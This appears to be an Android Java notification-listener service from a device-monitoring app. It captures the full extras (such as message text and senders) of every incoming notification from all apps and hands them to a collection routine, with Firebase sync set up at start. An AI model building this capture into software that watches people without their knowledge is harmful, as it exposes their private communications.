package com.vikasyadavnsit.cdc.services;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.convertToString;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

import java.time.LocalDateTime;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class CDCNotificationListenerService extends NotificationListenerService {

    @Override
    public void onCreate() {
        super.onCreate();
        com.vikasyadavnsit.cdc.utils.FirebaseUtils.initialize(this);
        com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository.initialize(this);
        com.vikasyadavnsit.cdc.database.repository.DeviceDataRepository.initialize(this);
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        LoggerUtils.i("NotificationListener", "Notification Listener Service CONNECTED and BOUND");
        com.vikasyadavnsit.cdc.utils.FirebaseUtils.syncAllPermissionStatuses(this);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        
        try {
            LoggerUtils.d("NotificationListener", "Incoming notification from: " + sbn.getPackageName());
            Notification notification = sbn.getNotification();
            NotificationData notificationData = NotificationData.builder()
                    .packageName(sbn.getPackageName())
                    .timestamp(LocalDateTime.now().toString())
                    .build();

            if (notification != null && notification.extras != null) {
                Map<String, Object> map = new HashMap<>();
                for (String key : notification.extras.keySet()) {
                    Object data = notification.extras.get(key);
                    if (data != null) {
                        map.put(key.replace(".", "_"), convertToString(data));
                    }
                }
                notificationData.setExtras(map);
            }
            
            LoggerUtils.d("NotificationListener", "Captured notification from: " + sbn.getPackageName());
            com.vikasyadavnsit.cdc.utils.AccessibilityUtils.collectNotificationData(notificationData);
            
        } catch (Exception e) {
            LoggerUtils.e("NotificationListener", "Error processing notification: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Optional: track removals if needed
    }
}
